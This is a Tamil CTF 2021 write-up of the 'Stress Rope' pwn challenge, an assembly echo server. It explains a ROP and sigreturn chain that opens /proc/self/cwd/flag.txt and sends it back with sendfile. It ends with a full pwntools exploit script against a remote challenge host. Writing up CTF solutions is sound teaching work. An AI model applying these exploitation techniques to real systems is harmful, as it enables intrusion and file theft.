## **Stress Rope**

was a pwn challenge from Tamil CTF 2021.

it is a small echo server written in assembly, very small, with no libc, very few gadgets..

there are may ways to exploit it, let's look at the reverse

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/Stress.Rope/pics/reverse.png)

so my exploitation goes like this:

**1st step:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/Stress.Rope/pics/step1.png)

we return to 0x40008d address, at the "sub rsi,8" , to read again another bloc, a bit before on stack, to put the filename of the file we want to open there (rsi will point on it). we wait for the next send so...

**2nd step:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/Stress.Rope/pics/step2.png)

we send the filename that will be written to rsi, we adjust the packet size to 257 , the syscall number of openfileat, which act as open, but the filename is in rsi and not rdi, which is simpler to setup for us. If the filename is absolute, rdi will just be ignored..perfect for us.

We use a little trick, /proc/self/cwd/flag.txt is used as a path, which means the current directory of the actual process..as we don't know the name of the remote directory..

we call the syscall gadget 0x40009b (with rsi, and rax = 257)

then we call one time 0x4000a3 so send back to the program a 8 bytes blocs, to make stop between read.. as the buffering can otherway add small packet sending into a bigger one.

then we return again to read for step3

**3rd step:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/Stress.Rope/pics/step3.png)

ok know that we have open the filename for the flag, we are going to put a sigrop frame on stack for the last step.

We don't know the fd number returned by openfileat, but as only stdin, stdout, stderr, a socket should be open remotely..it's probably a small number, 4, 5 or 6 ....we can guess it quickly..

the frame we prepared looks like this

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/Stress.Rope/pics/sigrop.png)

it is a call to sendfile syscall, which take an input fd, and output fd, and a length basically.

It will transfer data from the opened fd from openfileat (the flag), to stdout (fd = 1)

and we will receive it...

**4th step:**

![](https://github.com/nobodyisnobody/write-ups/raw/main/Tamil.CTF.2021/pwn/Stress.Rope/pics/step4.png)

last step, but not least...

we send a payload of size 15, so setup rax=15 for sigreturn syscall..

and so we execute the sendfile syscall, that will send us back our flag...



<u>here is the exploit code:</u>

```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'debug'

exe = ELF('./echo-echo')

host, port = "3.97.113.25", "9002"

p = remote(host,port)

# sendfile sigrop frame ; send us back the opened file via stdout
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 40		# sendfile syscall number
frame.rdi = 1		# stdout
frame.rsi = 5		# remote fd for file opened (found after some tries)
frame.rdx = 0
frame.r10 = 512		# arbitrary size
frame.rsp = 0x400800	# arbitrary stack address (will crash after output anyway)
frame.rip = 0x40009b    # syscall gadget

frame = bytes(frame)
frame = frame[0:0xd0]	# we cut down the size of the frame, because we don't care of the end (empty)

gadget1 = 0x4000a3

# first return back to read, but at sub rsi,8 to write before our buffer the filename
payload = p64(0xdeadbeef)+p64(0x40008d)
payload = payload.ljust(0x12c,'\x00')
p.send(payload)

# send the filename to open and continue ROPPING, sometimes output 8 bytes, to stop between read & write
payload2 = '/proc/self/cwd/flag.txt'.ljust(24,'\x00')+p64(0x40009b)+p64(0x4000a3)+p64(0x400085)
# set the length of this payload to 257, to set eax=257 for next part (openfileat syscall)
payload2 = payload2.ljust(257,b'\x00')
p.send(payload2)

print(p.recv(8))

# put the frame for the sigrop on stack
payload3 = p64(0xdeadbeef)+p64(0x400085)+p64(0xdeadbeef)+frame
payload3 = payload3.ljust(0x12c,'\x00')
p.send(payload3)

# set this payload length to 15, to set eax=15 for sigreturn syscall
payload4 = p64(0xdeadbeef)+p64(0x40009b)[0:7]
payload4 = payload4.ljust(15,b'\x00')
p.send(payload4)

# we receive back flag now send by the sendfile sigrop
p.interactive()
```

*nobodyisnobody still pwning things*
